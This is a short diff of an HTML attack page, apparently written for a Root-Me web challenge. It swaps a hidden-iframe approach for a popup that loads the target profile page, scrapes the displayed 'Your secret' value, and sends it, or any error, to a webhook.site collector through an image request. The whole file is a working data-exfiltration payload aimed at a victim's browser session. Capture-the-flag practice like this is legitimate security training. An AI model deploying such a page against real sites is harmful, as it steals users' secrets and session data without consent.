@@ -1,14 +1,17 @@
 <html>
-<iframe id="frame" src="http://challenge01.root-me.org:58003/profile" style="display:none"></iframe>
 <script>
+// Ouvrir la popup après un petit délai
 setTimeout(function() {
-    try {
-        var frame = document.getElementById('frame');
-        var secret = frame.contentDocument.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
-        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
-    } catch(e) {
-        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
-    }
-}, 2000);
+    var win = window.open('http://challenge01.root-me.org:58003/profile', '_blank');
+    // Attendre que la popup charge
+    setTimeout(function() {
+        try {
+            var secret = win.document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
+            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
+        } catch(e) {
+            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
+        }
+    }, 2000);
+}, 100);
 </script>
 </html>
